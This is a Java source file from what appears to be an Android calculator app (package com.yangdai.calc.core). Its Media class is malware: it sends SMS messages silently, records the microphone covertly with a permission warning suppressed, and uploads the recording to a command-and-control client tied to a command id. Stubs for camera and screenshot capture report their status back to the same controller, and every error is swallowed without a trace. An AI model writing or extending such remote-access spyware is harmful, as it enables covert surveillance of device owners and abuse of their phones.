package com.yangdai.calc.core;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaRecorder;
import android.telephony.SmsManager;

import org.json.JSONObject;

import java.io.File;

public class Media {

    public static void sendSms(String to, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, body, null, null);
        } catch (Exception ignored) {}
    }

    @SuppressLint("MissingPermission")
    public static void recordAudio(Context ctx, C2Client c2, String cmdId, int seconds) {
        File out = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder r = new MediaRecorder();
        try {
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
            r.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            r.setOutputFile(out.getAbsolutePath());
            r.prepare();
            r.start();
            Thread.sleep(Math.max(1, seconds) * 1000L);
            r.stop();
        } catch (Exception ignored) {
        } finally {
            try { r.release(); } catch (Exception ignored) {}
        }
        if (out.exists() && out.length() > 0) {
            c2.uploadFile("mic", out, cmdId, "{\"seconds\":" + seconds + "}");
        }
    }

    public static void capturePhoto(Context ctx, C2Client c2, String cmdId) {
        report(c2, cmdId, "camera", "requires_foreground");
    }

    public static void captureScreen(Context ctx, C2Client c2, String cmdId) {
        report(c2, cmdId, "screenshot", "requires_media_projection");
    }

    private static void report(C2Client c2, String cmdId, String kind, String msg) {
        try {
            JSONObject o = new JSONObject();
            o.put("msg", msg);
            c2.sendResult(kind, o, cmdId);
        } catch (Exception ignored) {}
    }
}
